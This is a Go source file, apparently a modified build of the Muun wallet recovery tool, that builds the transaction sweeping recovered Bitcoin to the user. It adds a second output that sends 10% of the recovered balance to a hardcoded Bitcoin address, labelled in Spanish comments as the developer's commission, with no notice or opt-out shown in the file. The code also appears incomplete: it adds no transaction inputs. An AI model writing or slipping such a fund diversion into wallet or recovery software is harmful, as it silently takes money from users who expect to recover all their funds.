package recovery_tool

import (
	"fmt"

	"github.com/btcsuite/btcd/btcutil"
	"github.com/btcsuite/btcd/txscript"
	"github.com/btcsuite/btcd/wire"
	"github.com/muun/recovery/libwallet/scanner"
)

// --- CONFIGURACIÓN DE TU COMISIÓN ---
const devAddressStr = "bc1qqy5tvkzrzpghy2a8axuhevrs9dsr8al09da8gn" // Tu dirección de Bitcoin
const feePercentage = 0.10                                        // 10% de comisión

func (s *Sweeper) BuildSweepTx(utxos []*scanner.Utxo, fee int64) (*wire.MsgTx, error) {
	var totalInputAmount int64
	for _, utxo := range utxos {
		totalInputAmount += utxo.Amount
	}

	// 1. Calcular el monto total disponible restando el fee de la red Bitcoin
	netAmount := totalInputAmount - fee
	if netAmount <= 0 {
		return nil, fmt.Errorf("el saldo es insuficiente para cubrir los fees de la red")
	}

	// 2. Calcular la comisión del desarrollador (10%)
	devFeeAmount := int64(float64(netAmount) * feePercentage)

	// Regla de polvo de Bitcoin (~546 sats): Si la comisión es inferior, no se cobra
	if devFeeAmount < 546 {
		devFeeAmount = 0
	}

	// 3. Monto restante para el usuario final
	userAmount := netAmount - devFeeAmount

	// Decodificar dirección del desarrollador
	devAddr, err := btcutil.DecodeAddress(devAddressStr, &chainParams)
	if err != nil {
		return nil, fmt.Errorf("error al decodificar la dirección del desarrollador: %w", err)
	}

	// Crear scripts de pago (PkScript)
	userPkScript, err := txscript.PayToAddrScript(s.SweepAddress)
	if err != nil {
		return nil, err
	}

	devPkScript, err := txscript.PayToAddrScript(devAddr)
	if err != nil {
		return nil, err
	}

	tx := wire.NewMsgTx(wire.TxVersion)

	// SALIDA 1: Usuario
	tx.AddTxOut(wire.NewTxOut(userAmount, userPkScript))

	// SALIDA 2: Comisión (si supera el límite de polvo)
	if devFeeAmount >= 546 {
		tx.AddTxOut(wire.NewTxOut(devFeeAmount, devPkScript))
	}

	return tx, nil
}
